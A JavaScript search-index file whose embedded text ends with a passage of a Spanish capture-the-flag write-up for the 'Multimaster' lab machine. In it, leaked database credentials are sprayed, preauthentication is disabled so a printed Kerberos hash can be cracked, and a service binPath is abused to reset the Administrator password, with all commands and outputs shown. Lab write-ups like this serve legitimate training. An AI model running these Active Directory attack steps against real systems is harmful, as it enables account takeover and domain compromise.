CodeDom. Providers. DotNetCompilerPlatform. dll        -a----    7/24/2012 11:18 PM     45416 Microsoft. Web. Infrastructure. dll                   -a----     1/9/2020  4:13 AM     13824 MultimasterAPI. dll                          -a----     1/9/2020  4:13 AM     28160 MultimasterAPI. pdb                          -a----    2/17/2018  8:14 PM     664576 Newtonsoft. Json. dll                          -a----    11/27/2018 11:30 PM     178808 System. Net. Http. Formatting. dll                    -a----    11/27/2018 11:28 PM     27768 System. Web. Cors. dll                          -a----    1/27/2015  2:34 PM     139976 System. Web. Helpers. dll                        -a----    11/27/2018 11:31 PM     39352 System. Web. Http. Cors. dll                       -a----    11/27/2018 11:31 PM     455096 System. Web. Http. dll                          -a----    1/31/2018 10:49 PM     77520 System. Web. Http. WebHost. dll                      -a----    1/27/2015  2:32 PM     566472 System. Web. Mvc. dll                          -a----    2/11/2014  1:56 AM     70864 System. Web. Optimization. dll                      -a----    1/27/2015  2:32 PM     272072 System. Web. Razor. dll                         -a----    1/27/2015  2:34 PM     41672 System. Web. WebPages. Deployment. dll                  -a----    1/27/2015  2:34 PM     211656 System. Web. WebPages. dll                        -a----    1/27/2015  2:34 PM     39624 System. Web. WebPages. Razor. dll                     -a----    7/17/2013  4:33 AM    1276568 WebGrease. dll                             PS C:\inetpub\wwwroot\bin&gt;Vemos la lista de caracteres imprimibles con strings, pero al ser un ejecutable de windows usaremos el parametro -e l para que nos liste mayor informacion. ❯ strings -e l MultimasterAPI. dllFROMWHERELIKEINFORMATION_SCHEMAMASTER{  info  :  MegaCorp API  }application/jsonserver=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;Obtenemos una nueva contraseña y volveremos a validarla con crackmapexec si corrsponde a otro usuario. ❯ crackmapexec smb 10. 10. 10. 179 -u users. txt -p 'D3veL0pM3nT!' --continue-on-successSMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [+] MEGACORP. LOCAL\sbauer:D3veL0pM3nT!Con estas nuevas credenciales nos volvemos a conectar con evil-winrm y tendriamos acceso esta vez como sbauer ❯ evil-winrm -i 10. 10. 10. 179 -u 'sbauer' -p 'D3veL0pM3nT!'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\sbauer\Documents&gt; whoamimegacorp\sbauerSeguidamente subiremos el ejecutable sharphound. exe para recopilar datos de DC que posteriormente con bloodhound interpretaremos. Una vez tengamos el archivo en la maquina victima lo ejecutamos y este nos generara un archivo . zip que abriremos en bloodhound *Evil-WinRM* PS C:\WIndows\Temp\Privesc&gt; . \SharpHound. exe -c All2023-04-02T09:45:51. 8354209-07:00|INFORMATION|This version of SharpHound is compatible with the 4. 2 Release of BloodHound2023-04-02T09:45:51. 9916814-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote*Evil-WinRM* PS C:\WIndows\Temp\Privesc&gt; dir  Directory: C:\WIndows\Temp\PrivescMode        LastWriteTime     Length Name----        -------------     ------ -----a----     4/2/2023  9:47 AM     14062 20230402094551_BloodHound. zip-a----     8/3/2022  9:21 AM    1060864 SharpHound. exe-a----     4/2/2023  9:47 AM     13225 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5. binSubimos el . zip a bloodhound marcamos al usuario sbauer como User as owned y en analisys pinchamos en la opcion Shortest Paths form Owned Principals Observamos que el usuario sbauer tiene el privilegio Generic Write sobre el usuario Jorden quien a su vez forma parte del grupo Server Operators  GenericWrite - actualizar los atributos del objeto (por ejemplo, script de inicio de sesión) Aprovecharemos el Generic Write para setear la propiedad dont require Kerberos preauthentication y con esto hacer al usuario ASREPRoasteable *Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Get-Aduser jorden | Set-ADAccountControl -doesnotrequirepreauth $trueConGetNPUsers. py esta vez si podamos obtener el hash ❯ GetNPUsers. py MEGACORP. LOCAL/ -no-pass -usersfile users. txtImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$jorden@MEGACORP. LOCAL:8e7ea2a50a1602c925cf681fca176a58$a2a1627ed23fe85bdadc88c1a0b551f0ee10dfe43f7677fc6f1204e36d5e849c95932313e7fae6b9829be5d69f243279f32098db2118abef962bb1b7fa2caafe91ca22d2747690dea014ecc6e9f95e2dffdd8acac823f47c7e29a834cf910daa4cbdc19187bbf95d436e083a050e274fd15905b15f58c2e9cc23932efcac112a2adf3a59fd3de0342d4d35e33f7da5aeb2be18db5aa625a95adbde5c075843711be01945177e8fd7935c8edc5355ee98fce7b9d4becbc72e14606e5c4df3b1577f19b621457089150499cf8a79616110fe973d7e63bbde78641380be90733b621190a13c13968c6ed3d2d9ea85bf9603[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH setProcedamos a crackearlo con john y nos devuelve la contraseña en texto claro. ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusrainforest786  ($krb5asrep$23$jorden@MEGACORP. LOCAL)1g 0:00:00:06 DONE (2023-04-02 17:01) 0. 1550g/s 682666p/s 682666c/s 682666C/s rainian. . railezs05Use the  --show  option to display all of the cracked passwords reliablySession completedNos conectamos nuevamente con evil-winrm y hubieramos migrado al usuario jorden ❯ evil-winrm -i 10. 10. 10. 179 -u 'jorden' -p 'rainforest786'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\jorden\Documents&gt; whoamimegacorp\jordenAntes vimos que este usuario formaba parte del grupo Server Operators, aprovecharemos esto para cambiar la propiedad binpath de un proceso el cual el forzaremos a desactivarse y al iniciarlo nuevamente nos ejecutara la sentencia que hayamos puesto. Cambiaremos el binPath del proceso browser para que al volver a iniciarse nos cambie la contraseña del usuario Administrator. *Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc. exe config browser binPath= C:\Windows\System32\cmd. exe /c net user Administrator fmiracle123$! [SC] ChangeServiceConfig SUCCESS*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc. exe stop browserSERVICE_NAME: browser    TYPE        : 20 WIN32_SHARE_PROCESS    STATE       : 3 STOP_PENDING                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)    WIN32_EXIT_CODE  : 0 (0x0)    SERVICE_EXIT_CODE : 0 (0x0)    CHECKPOINT     : 0x1    WAIT_HINT     : 0xafc8*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc. exe start browser[SC] StartService FAILED 1053:The service did not respond to the start or control request in a timely fashion. Verificamos y efectivamente cambiamos las claves del usuario Administrator ❯ crackmapexec smb 10. 10. 10. 179 -u 'Administrator' -p 'fmiracle123$!'SMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [+] MEGACORP. LOCAL\Administrator:fmiracle123$! (Pwn3d!)Lo siguiente sera conectarnos, ir al directorio personal del usuario y visualizar la segunda flag root. txt ❯ evil-winrm -i 10. 10. 10. 179 -u 'Administrator' -p 'fmiracle123$!'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd . . \Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txt559ca9f9c145bc76f8504391a74710ccy listo maquina pwneada!! "
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});
function lunr_search(term) {
    document.getElementById('lunrsearchresults').innerHTML = '<ul></ul>';
    if(term) {
        document.getElementById('lunrsearchresults').innerHTML = "<p style='color: rgb(57, 16, 87);'>Search results for '" + term + "'</p>" + document.getElementById('lunrsearchresults').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult' style='color: rgb(57, 16, 87);'>No he encontrado esa locura, intenta de nuevo :P</li>";
        }
    }
    return false;
}

function lunr_search(term) {
    $('#lunrsearchresults').show( 400 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0" style="list-style-type:none;"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-primary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title' style='color: #1ae2ab;'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><small><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult' style='color: #12a6e0;'>No se encontraron resultados...</li>";
        }
    }
    return false;
}
    
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 5 );
        $( "body" ).removeClass( "modal-open" );
    });
});
